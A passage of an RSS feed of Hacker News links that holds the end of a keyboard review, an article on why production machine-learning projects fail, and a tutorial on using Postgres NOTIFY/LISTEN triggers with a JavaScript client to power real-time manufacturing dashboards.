<p>I suspect the largest contributing factor to my development of CT was the usage of the trackpad on my laptop. Having to twist my hand and finger to move from keyboard use to having my thumb at the nearest edge of the laptop for pressing mouse buttons was likely the repetitive strain that triggered it.</p>

<p>While split, I never need to move my wrists, instead, I move the keyboard so that it’s exactly where my hands want to rest naturally. Problem solved.</p>



<p><img src="https://unhexium.net/images/uhk/desk1cut.jpg" alt=""></p>

<p>While splitting is certainly the most eye-catching features of the UHK, the LED display and steel plate construction also make it look (and feel) very premium.</p>

<p>You can of course order different colors of cases, mine being red, but the option exists such that I could easily grab a second case and customize it with paint or other mods.</p>

<p>In the future I will likely switch out the cable and keycaps to suit whatever design preferences I might have accumulated then.</p>



<p>In the first month of usage I had to change the ordering of the bottom modifier keys in order to reduce the reach strain from my most common shortcuts, I currently have them laid out as:</p>

<div><div><pre><code>Ctrl Super Fn Alt Mod || Space Super Alt Fn Ctrl
</code></pre></div></div>

<p>The goal here was to keep Super close to the right thumb and Alt close to the left thumb, because <code>Super-</code> is my window management base on Pop_OS! and Alt is used for switching terminal panes (where the right hand applies arrow keys I/HJKL) and managing textual multi-cursor.</p>

<p>It was super easy to just pop the keys off, rearrange, and reconfigure in UHK Agent.</p>

<p>I doubt I’m in the majority here, but when I touch type I used to hit the <code>Y</code> key with my left hand, since the UHK though it’s forced me to fix that habit and use the closer hand.</p>



<p>Currently my biggest gripe out of the whole experience is the mini USB connector method.</p>

<p>The connector itself is better than micro USB, but the placement of the connector underneath the top flange should have a better method of securing it instead of a simple cable pinch hole. The cable almost never stays stuck in the hole and often just causes more stress as a bend point.</p>

<p>I would love a switch to type-C with a latch mechanism, or even just keeping the connector outward facing like the RJ11 bridge would be fine.</p>

<p>After the connector, my only other problem is that the bridge cable gets squished whenever I place the keyboard inside a sleeve. I can’t immediately come up with a solution for this, since the extra slack in the already curled cable is definitely needed, but you should note to buy a case with a little more room vertically if you don’t want a squished looking bridge cable.</p>

      
    </div><!-- /.entry-content -->
  </article></div>]]>
            </description>
            <link>https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26351600</guid>
            <pubDate>Fri, 05 Mar 2021 02:08:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Production Machine Learning Fails – and How to Fix It]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26350953">thread link</a>) | @rkearns
<br/>
March 4, 2021 | https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/ | <a href="https://web.archive.org/web/*/https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
<p><em>Machine learning has emerged as a must-have tool for any serious data team: augmenting processes, generating smarter and more accurate predictions, and generally improving our ability to make use of data.</em></p>



<p><em>However, discussing applications of ML in theory is much different than actually applying ML models at scale in production. In this article, we walk through common challenges and corresponding solutions to making ML a force multiplier for your data organization.&nbsp;</em></p>



<p>From generating your weekend bike route on Google Maps to helping you discover your next binge-worthy show on Netflix, machine learning (ML) has evolved well beyond a theoretical buzzword into a powerful technology that most of us use every day.&nbsp;</p>



<p>For the modern business, the appetite for ML has never been stronger. But while certain industries have been transformed by the automation made possible by ML—think <a href="https://www.businessinsider.com/ai-in-banking-report" target="_blank" rel="noopener">fraud detection</a> in finance and <a href="https://customerthink.com/explained-working-and-advantages-of-a-recommendation-engine/" target="_blank" rel="noopener">personalized product recommendations</a> in e-commerce—the hard truth is that many ML projects fail before they ever see the light of day.&nbsp;</p>



<p>In October 2020, <a href="https://www.gartner.com/en/newsroom/press-releases/2020-10-19-gartner-identifies-the-top-strategic-technology-trends-for-2021#:~:text=Gartner%20research%20shows%20only%2053,a%20production%2Dgrade%20AI%20pipeline." target="_blank" rel="noopener">Gartner reported</a> that only 53% of projects make it from prototype to production—and that’s at organizations with some level of AI experience. For companies still working to develop a data-driven culture, that number is likely far higher, with <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/" target="_blank" rel="noopener">some failure-rate estimates</a> soaring to nearly 90%.&nbsp;</p>



<p>Data-first tech companies like Google, Facebook, and Amazon are transforming our daily lives with ML, while many other well-funded and highly talented teams are still struggling to get their initiatives off the ground. But why does this happen? And how can we fix it?</p>



<p><strong>We share the four biggest challenges modern data teams face when adopting ML at scale— and how to overcome them.&nbsp;</strong></p>



<h3>Misalignment between actual business needs and ML objectives</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>When your business objectives and ML goals are misaligned, all of your best laid plans are bound to fail, just like that model you trained with stale data. Image courtesy of <a href="https://unsplash.com/photos/pjAH2Ax4uWk" target="_blank" rel="noopener">Charles Deluvio</a> on <a href="https://unsplash.com/s/photos/machine-learning" target="_blank" rel="noopener">Unsplash</a>.</figcaption></figure></div>



<p>The first challenge is strategic, not technical: starting with a solution instead of a clearly defined problem.&nbsp;</p>



<p>As companies race to incorporate ML into their organizations, leaders may hire data scientists and ML practitioners to automate or improve processes without a mature understanding of <a href="https://developers.google.com/machine-learning/problem-framing/good" target="_blank" rel="noopener"><strong>which problems are actually suitable for ML</strong></a> to solve. And even when the business problem is a good fit for ML, without a shared definition of what success looks like, projects can languish in experimentation mode for months while stakeholders wait for an idealized level of machine-like perfection that can never be reached.&nbsp;</p>



<p>Machine learning is not magic, it will not solve every problem perfectly, and should, by nature, continue to evolve over time. Sometimes, a model merely achieving the same results as humans is a worthy project—errors and all.&nbsp;</p>



<p>Before starting any project, ask your team or your stakeholders: <em>What business problem are we trying to solve? Why do we believe that ML is the right path? What is the measurable threshold of business value this project is trying to reach? What does “good enough” look like?&nbsp;</em></p>



<p>Without these clear, shared definitions articulated at the outset, many worthy ML projects will never reach production and valuable resources will be wasted. Solve a business problem using ML and not just embark on a ML project for checking off the ML box.</p>



<h3>Model training that doesn’t generalize</h3>



<p>With a clearly defined business problem and targeted success metrics, your potential pitfalls get more technical. During the model training stage, issues related to your training data or model fit are the likeliest culprit for future failure.&nbsp;</p>



<p>The goal of <a href="https://elitedatascience.com/model-training" target="_blank" rel="noopener"><strong>model training</strong></a> is to develop a model that can generalize, or make accurate predictions when given new data because it understands the relationships between data points and can identify trends. Your training dataset should be clean, sizable, and representative of the real-time data your model is expected to process once in production. No where has one seen clean data in a production environment. Expect to spend considerable time cleaning, labeling&nbsp; and feature engineering just to get the data ready.</p>



<p>Representative training data is also key: If your training data doesn’t reflect the actual datasets your model will encounter, you may end up with a model that won’t perform once you’ve reached testing or production.&nbsp;</p>



<p>Another issue that can occur during training is overfitting and underfitting. Overfitting happens when a model learns <em>too much </em>and produces outputs that fit too closely with your training data.</p>



<p>Underfitting is simply the opposite—your model doesn’t learn enough to make useful predictions on even the training data itself, let alone new data it will encounter in testing or production.</p>



<h3>Testing and validation issues</h3>



<p>As you test and validate your models, new challenges can arise from merging multiple data streams and making updates to improve performance. Changes to data sources, model parameters, and <a href="https://en.wikipedia.org/wiki/Feature_engineering" target="_blank" rel="noopener"><strong>feature engineering</strong></a> all introduce room for error.&nbsp;</p>



<p>This may also be the stage when you detect overfitting or underfitting in your model—a model that performed wonderfully during training but fails to produce useful results during testing may be overfit.&nbsp;</p>



<p>Even at companies like Google, where ML engineers abound, <a href="https://www.technologyreview.com/2020/04/27/1000658/google-medical-ai-accurate-lab-real-life-clinic-covid-diabetes-retina-disease/" target="_blank" rel="noopener">surprises</a> in your product models can—and will—arise.&nbsp;</p>



<h3>Deployment and serving hurdles</h3>



<p>Deploying ML projects is rarely simple, and teams typically can’t use consistent workflows to do so—since ML projects solve a wide range of business problems, there’s a similarly wide range of ways to host and deploy them. For example, some projects require batched predictions on a regular basis, while others need to generate and deliver predictions on-demand when an application makes an API request to predict using the model. (This is part of why it’s challenging to make models apply to different use cases, no matter how appealing it may sound to executives who may view ML models as more magic than narrowly focused functions.)</p>



<p>Additionally, some ML projects can require a lot of resources, and cross-functional teams need to agree upon priorities of deployment. Engineers only have so many things they can productionalize, and as we’ve discussed, ML projects are much more than models and algorithms: most will need infrastructure, alerting, maintenance, and more to be successfully deployed.&nbsp;</p>



<p>This is why it’s so important to articulate the business problem clearly at the outset, agree upon what success looks like, design an end-to-end solution, and have a shared understanding of your ML project’s value compared to other priorities. Without this strategic plan, your project may never receive the engineering resources it needs to finally reach production.&nbsp;</p>



<p>For just one example, Netflix never productionalized its <a href="https://www.wired.com/2012/04/netflix-prize-costs/" target="_blank" rel="noopener">million-dollar prize-winning recommendation algorithm</a> due to the winning model’s complexity to implement—instead choosing another submission that was simpler to integrate.&nbsp;&nbsp;</p>



<h3>Tactics for scalable ML in production</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg" alt="" width="768" height="515" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-300x201.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-768x515.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1536x1030.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-2048x1373.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Machine learning isn’t magic, but it is powerful—and often misunderstood.&nbsp; Sort of like this paper stick figure. Image courtesy of <a href="https://unsplash.com/photos/67L18R4tW_w" target="_blank" rel="noopener">Kobu Agency</a> on <a href="http://www.unsplash.com/" target="_blank" rel="noopener">Unsplash.</a></figcaption></figure></div>



<p>Beyond strategic planning and staffing, there are concrete steps you can take to help scale your ML production.&nbsp;</p>



<h4>Lean into the cloud</h4>



<p>If your teams are working locally instead of in the cloud, it’s time to shift. Working in the cloud is the “glue” that keeps model training and deployment workflows in lockstep. Most vendors and open-source tools are developed for the cloud, and once there, it’s much easier to automate processes. Testing, training, validation and model deployment needs to be a repeatable process, it should not go from local Python code to a production environment.</p>



<h4>Leverage a DevOps approach</h4>



<p>Just as we’ve talked about applying DevOps practices to data, like <a href="https://www.montecarlodata.com/how-to-make-your-data-pipelines-more-reliable-with-slas/"><strong>setting data SLAs</strong></a> and measuring data health along <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/">observability pillars</a>, ML teams can follow in DevOps’ footsteps by implementing the <strong><a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html" target="_blank" rel="noopener">Continuous Integration (CI) and Continuous Delivery (CD)</a> model</strong>, while introducing <a href="https://cloud.google.com/solutions/machine-learning/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning" target="_blank" rel="noopener">Continuous Training (CT)</a>. By setting up agile build cycles and tools, ML teams can more rapidly deliver changes into the codebase and improve overall performance.&nbsp;</p>



<p>Similar to DevOps best practices, ML teams should use containerization to consistently run software across any type of device and make it simpler for engineers to productionalize their work. Keeping a consistent and visible build process that deploys smaller changes more frequently allows the team to work more smoothly and have more insight into what’s working well, and what’s not. Visibility also helps would-be code “gatekeepers” trust the build process and speed up the ML team’s workflow.&nbsp;</p>



<p>Investing time to build a strategic MLOps team and processes will help by reducing the likelihood of a project stalling out before production, and making continuous improvements feasible—setting every project up for long-term success.</p>



<h4>Invest in observability and monitoring&nbsp;</h4>



<p>Finally, the primary rule of machine learning is that your outcomes will only be as good as your inputs. Healthy data is absolutely essential to ML. Without clean data and working pipelines, models won’t be able to perform to their fullest potential and may fail to make accurate predictions.&nbsp;</p>



<p>And when you’re relying on ML to make important business decisions, you don’t want to find out about a broken pipeline or inaccurate data after those outputs have already been delivered.&nbsp;</p>



<p>That’s why <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/"><strong>data observability</strong></a>, which provides a full understanding and comprehensive monitoring of data health—and can prevent bad data from reaching your ML models in the first place—is well worth the investment.&nbsp;</p>



<h3>Achieving ML production at scale</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/matthew-henry-fPxOowbR6ls-unsplash-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>You don’t need to design the next motion-activated security camera to make an …</figcaption></figure></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/">https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/</a></em></p>]]>
            </description>
            <link>https://www.montecarlodata.com/why-production-machine-learning-fails-and-how-to-fix-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26350953</guid>
            <pubDate>Fri, 05 Mar 2021 00:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Postgres Notify for Real Time Dashboards]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26350862">thread link</a>) | @epberry
<br/>
March 4, 2021 | https://blog.arctype.com/postgres-notify-for-real-time-dashboards/ | <a href="https://web.archive.org/web/*/https://blog.arctype.com/postgres-notify-for-real-time-dashboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>We’re going to take a look how I used a Postgres feature, <code>pg_notify</code>, to power a work schedule for a manufacturing company. This particular product went through a dozen or so stages of manufacture, and each time a product advanced to its next stage the worker would record that progress from their workstation. The app we will build in this post displayed this schedule and allowed everyone to see the day’s progress.</p><h3 id="the-observer-pattern-in-sql">The Observer Pattern in SQL</h3><p>If you’re only used to using the standards of SQL in Postgres, the <code>NOTIFY</code> and <code>LISTEN</code> commands might not be familiar. But with these two commands you can implement something akin to the Observer pattern, but in your SQL engine!</p><p>The Observer pattern allows one class of object to “listen” for incoming events and another class to send events to those listeners. This pattern is commonly used for instances where data is being updated or changed, and several possibly unrelated objects need to react to those changes.</p><h3 id="observer-examples">Observer Examples</h3><p>Listening to state changes from a Redux store from inside of a React component is a common example of this pattern. Many React components listen to a single part of the Redux store. Android’s LiveData is another great example of this pattern, where observers can be created to watch for changes and immediately update the state and UI of an app.</p><h3 id="observing-in-postgresql">Observing in PostgreSQL</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1000w, https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>System architecture with pg_notify as the event bus.</figcaption></figure><p><code>NOTIFY</code> and <code>LISTEN</code> work together to allow you to implement this design within your Postgres database. Generally, <code>NOTIFY</code> will be called inside of a SQL query, oftentimes within a trigger. <a href="https://blog.arctype.com/learn-sql-triggers/">Triggers and event-based models go together well.</a> </p><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><p><code>LISTEN</code> is called from your Postgres client. When an event is triggered by <code>NOTIFY</code> the client will be notified. The event contains a payload so the client can tell what event was triggered (this can also contain metadata or actual data from the database). How your client receives this notification and how you are able to process it from there varies from client to client. In our example, the client will use WebSockets to update each connected schedule client after it receives the signal from <code>pg_notify</code>.</p><h2 id="building-the-work-schedule-app">Building the Work Schedule App</h2><h3 id="schema-design">Schema Design</h3><p>Let’s begin on the Postgres side. We are modeling items that are being manufactured. Items in production will be represented by the <code>production_item</code> table. Each <code>production_item</code> has an associated <code>product_id</code> &nbsp;and a current stage of production. </p><figure><img src="https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Frame-27--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Frame-27--1-.png 1000w, https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png 1498w" sizes="(min-width: 720px) 720px"><figcaption>ERD Diagram made with <a href="https://blog.arctype.com/erd-builder/">Arctype's Free Figma template</a>.</figcaption></figure><p>We could store the current production stage as a column in the <code>production_item</code> table, but that would only allow us to see what stage the item is in currently. Instead, we’ll use a <code>production_item_wip</code> (work-in-progress) table where each row will contain a timestamp as the item progresses through the stages of production. Let’s also create a table that stores all the possible stages of production, <code>production_stage</code>. <code>production_stage</code> will have an <code>idx</code> integer column to store the order in which the stages occur. The query below creates the <code>production_item_wip</code> table, as an example.</p><pre><code>create table production_item_wip (  
  id serial primary key,  
  insert_time timestamp default NOW(),  
  production_item_id int references production_item(id),  
  production_stage_id int references production_stage(id),  
  employee_id int references employee(id)  
); </code></pre><p>PROTIP: You may notice I’ve included <code>insert_time</code> on every table. We will not need to use this column on every table for this particular example right now, but I’ve found that it often proves useful in the future. I spend a significant amount of time building queries and extracting useful statistics, and countless times I’ve been unable to use data because it lacked an <code>insert_time</code>. I would err on the side of adding it when designing database schema in general, if you’re unsure whether or not you should.</p><h3 id="postgres-notify-syntax">Postgres NOTIFY Syntax</h3><p>Using NOTIFY to send an event is dead simple! Here is a trigger procedure that sends a notification to the order_progress_event channel.</p><pre><code>create
or replace function fn_production_stage_modified() returns trigger as $psql$
begin
  perform pg_notify(
    'order_progress_event',
    'Time to refresh those screens!'
  );return new;
end;$psql$ language plpgsql;</code></pre><p><code>pg_notify</code> lends itself well to being used within a trigger when used to deliver real-time data streaming. However, you could just as easily call <code>pg_notify</code> from a regular SQL query: <code>select pg_notify('order_progress_event', 'Hello world!');</code></p><p>Inside of a PL/pgSQL procedure, you cannot <code>SELECT</code> a function, like <code>pg_notify</code>, that returns void. Doing so will cause a Postgres error. That’s why in the first example we use <code>perform</code>, while in the second we can simply use <code>select</code>.</p><p>With that procedure created, let’s add the actual trigger so that whenever an item moves along in the production process, and thus another row is inserted for <code>production_item_wip</code>, the procedure above is called.</p><pre><code>create trigger production_stage before
insert
  on production_item_wip for each row execute procedure fn_production_stage_modified();</code></pre><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html--><p>That’s it! In this example the payload is the same each time. You could send actual data rather than just an alert, but in this example I prefer to send a basic notification so the client application can receive it and then in turn, select <em>exactly</em> what it needs in a separate query.</p><p>Encoding data within a notification, whether it’s a push notification or one from something like <code>pg_notify</code>, requires you to abstract away the source of the notification, assuming the data is normally delivered via an HTTP API. Using notifications as a “hint” for your software to reach out and get fresh data from an HTTP API simplifies the process and helps you reduce the number of different data sources you need to maintain.</p><h3 id="postgres-listen-syntax">Postgres LISTEN Syntax</h3><p>Listening to a channel is even simpler: <code>LISTEN order_progress_event;</code> </p><p>That really is all.</p><p>When this event is called, we’ll want to select the latest production data for the day. Here’s a view that will show how many products have progressed through each production stage today:</p><pre><code>create view view_daily_production_stats as
select
  count(1) as stage_count,
  ps.name as stage_namefrom production_item_wip piw
  join production_stage ps on ps.id = piw.production_stage_idwhere date(piw.insert_time) = date(now())
group by
  ps.id</code></pre><p>Now that your client is listening, how can you react to events it receives? This varies by client, since the featuresets of programming languages that serve async events vary heavily. We are using JavaScript’s <code>pg</code> client in this example. JavaScript is commonly used for asynchronous web programming.</p><pre><code>var clients = [];
function eventCallback(event) {
  query('select * from view_daily_production_stats', (data) =&gt; {
    clients.map(c =&gt; {
      c.send(data);
    });
  });
}
client.connect(function(err, client) {
  var query = client.query("LISTEN order_progress_event");
  client.on("notification", eventCallback);
});
;  </code></pre><p>Whenever a new event is received by the PostgreSQL client, the function <code>eventCallback</code> will be called with the payload from <code>NOTIFY</code>. The callback then queries the view we wrote earlier to select the most recent production stage data, and loops through to send the new data to all of the listening clients (Raspberry Pis). The clients receive the data and render HTML.</p><h3 id="putting-it-all-together">Putting it all Together</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/IMG_0744.JPG 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/IMG_0744.JPG 1000w, https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG 1600w" sizes="(min-width: 720px) 720px"></figure><p><code>pg_notify</code> is simple, built-in to PostgreSQL feature that has tons of different potential use cases. If you need a simple, real-time notification of just a few specific events, consider checking it out! <a href="https://blog.arctype.com/p/a2b910df-311c-4f7f-b902-7953de122f4b/www.arctype.com/">Arctype</a>, with its functions for running Javascript alongside SQL, is built for developers who want to build applications like this.</p><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html-->
          </div></div>]]>
            </description>
            <link>https://blog.arctype.com/postgres-notify-for-real-time-dashboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26350862</guid>
            <pubDate>Fri, 05 Mar 2021 00:50:06 GMT</pubDate>
        </item>
    </channel>
</rss>
